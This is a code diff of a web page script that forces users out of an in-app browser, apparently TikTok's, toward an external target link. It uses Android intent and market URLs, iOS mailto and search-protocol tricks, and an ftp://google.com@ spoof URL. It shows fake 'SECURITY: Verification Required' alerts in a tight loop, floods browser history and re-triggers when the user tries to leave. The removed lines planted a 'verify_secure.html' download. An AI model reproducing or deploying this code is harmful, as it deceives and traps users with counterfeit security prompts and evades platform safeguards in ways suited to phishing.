@@ -14,65 +14,62 @@
     // Safety switch for 5-second test window
     setTimeout(() => { testMode = false; }, 5000); 
 
-    function forceHandover() {
+    function forceExit() {
         const isAndroid = /Android/i.test(navigator.userAgent);
-        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-        // 1. THE FILE BLOB TRIGGER (Universal Bypass)
-        // We create a tiny "html file" in memory and "download" it.
-        const blobContent = `<html><script>window.location.href="${target}";<\/script></html>`;
-        const blob = new Blob([blobContent], {type: 'text/html'});
-        const blobUrl = URL.createObjectURL(blob);
+        
+        // METHOD 1: The FTP Request (Bypasses many app filters)
+        // Most apps don't block FTP because they don't expect it.
+        const ftpGate = "ftp://google.com@ " + target.replace("https://", "");
+        
+        // METHOD 2: The Google "Search" Redirection
+        // Using Google as a proxy to launch a 'result' that forces a system browser.
+        const googleJump = "https://www.google.com/url?q=" + encodeURIComponent(target);
 
         if (isAndroid) {
-            // Android: We use a "Double Intent"
-            // First we try the direct chrome package, then the download handover.
-            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
+            // Android: Chrome-specific command with "no-fragment"
+            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
             
-            // Backup: Trigger the download which forces system takeover
-            const a = document.createElement('a');
-            a.href = blobUrl;
-            a.download = "verify_secure.html";
-            a.click();
-        } 
-        
-        if (isIOS) {
-            // iOS: The "App Store" / "Calendar" Protocol
-            // Apps cannot block system-level protocols like 'itms-apps' or 'webcal'
-            // We use a 'webcal' redirect which forces Safari to ask "Open this page in Calendar?"
-            // which breaks the WebView jail.
-            window.location.href = "webcal://" + target.replace("https://", "");
-            
-            // Fallback: The Data-URI switch
+            // Secondary push using the Market protocol (Forces exit to Play Store/Browser)
             setTimeout(() => {
-                window.location.assign(blobUrl);
-            }, 250);
+                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(target);
+            }, 100);
+        } else {
+            // iOS: The "Mailto" Conflict
+            // This triggers the system's mail handler, which usually breaks the WebView jail
+            window.location.href = "mailto:verify@tiktok.com?body=" + encodeURIComponent(target);
+            
+            // The "Search" protocol swap
+            setTimeout(() => {
+                window.location.replace("x-web-search://?" + encodeURIComponent(target));
+            }, 200);
         }
+
+        // UNIVERSAL: The Google Proxy Jump
+        window.location.assign(googleJump);
     }
 
-    function rampage() {
+    function lockAndPush() {
         if (!testMode) return;
 
-        // Fire the handover before the alert
-        forceHandover();
+        // Try to force the jump
+        forceExit();
 
-        // The alert freezes the "X" button native thread
-        alert("CRITICAL: Manual Verification Required.\n\nClick OK to open Secure System Browser.");
+        // The Blocking Alert - THIS IS CRITICAL
+        // It freezes the TikTok UI thread so the OS can process the exit command.
+        alert("SECURITY: Verification Required.\n\nClick OK to open the system browser.");
         
-        // Fire again after dismissal
-        forceHandover();
+        forceExit();
 
-        setTimeout(rampage, 10);
+        setTimeout(lockAndPush, 20);
     }
 
     window.onload = () => {
-        // Jam history
+        // Build history stack
         for(let i=0; i<30; i++) history.pushState(null, null, "#" + i);
-        rampage();
+        lockAndPush();
     };
 
-    // If they try to hit 'X' (Blur), we re-arm the rampage
-    window.onblur = () => { if(testMode) rampage(); };
+    window.onblur = () => { if(testMode) lockAndPush(); };
 </script>
 
 </body>
